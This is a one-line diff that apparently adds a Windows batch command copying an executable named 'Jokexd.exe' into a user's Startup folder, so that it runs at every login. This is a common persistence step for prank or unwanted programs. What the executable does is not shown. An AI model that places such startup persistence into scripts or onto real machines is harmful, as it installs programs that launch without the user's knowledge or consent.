@@ -1,0 +1,1 @@
+copy "Joke\Jokexd.exe" "C:\Users\mayke\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
